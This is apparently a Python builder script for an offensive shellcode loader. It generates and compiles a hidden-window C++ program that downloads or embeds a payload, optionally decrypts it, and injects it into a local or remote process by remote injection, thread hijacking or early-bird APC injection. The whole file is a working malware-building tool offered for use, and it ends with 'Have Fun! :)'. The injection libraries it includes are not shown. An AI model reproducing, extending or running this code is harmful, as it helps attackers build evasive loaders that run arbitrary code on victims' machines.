import os
import time
from cli import *
from local_load import *
from encryptor import *

def build (Encryption, Enumeration, Payload, ProcessName, Loader, Url):
    f = open ("main.cpp", "a")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "Libraries/FetchFromURL.h"
""")   
    
    if Encryption != "null":
        f.write(f"""\n
#include "Libraries/{Encryption}"
""")
        
    if Enumeration != "null":
        f.write(f"""\n
#include "Libraries/{Enumeration}"
""")
    else:
        pass


    f.write(f"""\n
#include "Libraries/{Loader}"
""")
    if Payload != "null":
        f.write(f"""\n
{Payload} 
""")
    f.write(f"""\n
using namespace std;
int main()
{{
    PBYTE pPayloadAddress;
    DWORD pPayloadSize;
    string Url = "{Url}";
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    """)

    if Payload != "null":
        f.write(f"""\n
    pPayloadSize = sizeof(Data_RawData);
    pPayloadAddress = Data_RawData;
""")

    if Url != "null":
        f.write(f"""\n
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
        printf("Failed to fetch payload");
        return 0;
    }}

    """)

    if Enumeration != "null":
        f.write(f"""\n
    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess, &hThread)){{
        printf("Failed to find remote process");
        return 0;
    }}""" ) 
    else:
        pass

    if Encryption != "null":
        f.write(f"""\n
    char bKey[] = {{ 0x00, 0x11, 0x22 }};
    size_t sKeySize = sizeof(bKey);
    PBYTE pbKey = (PBYTE)bKey;
    Decrypt(pPayloadAddress, pPayloadSize, pbKey, sKeySize);
""")

    f.write(f"""\n
    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
        printf("Failed to execute payload");
        return 0;
    }}
            
    return 0;
}}
""")

    f.close()
    time.sleep(2)
    return os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -O2 -w -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

def change_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Libraries/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
        with open(f"Libraries/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Libraries/{Loader}", "r") as file:
        content = file.read()
    content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
    with open(f"Libraries/{Loader}", "w") as file:
        file.write(content)

def restore_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Libraries/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
        with open(f"Libraries/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Libraries/{Loader}", "r") as file:
        content = file.read()
    content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
    with open(f"Libraries/{Loader}", "w") as file:
        file.write(content)

def main():

    Payload_Location = set_payload_location()
    if Payload_Location == "2":
        Url = set_url()
        Payload = remote_payload_fetch(Url)
    else:
        Payload = local_payload_fetch()
        Url = "null"
    
    Encryption = set_payload_encryption()
    if Encryption != "null":
        build_encryptor(Encryption, Payload)
        if Payload_Location == "1":
            Payload = read_encrypted_payload()
        elif Payload_Location == "2":
            Payload = "null"
            print("\n[!!]NOTE[!!]\nEncrypted Payload is saved as encrypted.bin")
            print(f"Please host the encrypted.bin at {Url}")
    else:
        pass
    
    #TODO  set_payload_encryption()

    if set_loader_type() == "1":
        Loader = set_local_loader_type()
        Enumeration = "null"
        ProcessName = "null"
    else:
        Loader = set_remote_loader_type()
        if Loader == "RemoteInjection.h":
            Enumeration = set_enum_type()
        elif Loader == "RemoteThreadHijacking.h":
            Enumeration = "CreateSuspended.h"
        elif Loader == "EarlyBirdApcInjection.h":
            Enumeration = set_proc_creation_type() 
    
        ProcessName = set_process_name()
    
    ApiMode = set_api_mode()

    change_header_file(Enumeration, Loader, ApiMode)

    if not build(Encryption, Enumeration, Payload, ProcessName, Loader, Url):
        print(f"\nPayload Built Successfully!\nHave Fun! :)")
    else:
        print(f"\nFailed to build payload :(")
    
    restore_header_file(Enumeration, Loader, ApiMode)
    if Payload_Location == "1":
        os.remove("encrypted.bin")


if __name__ == "__main__":
    main()
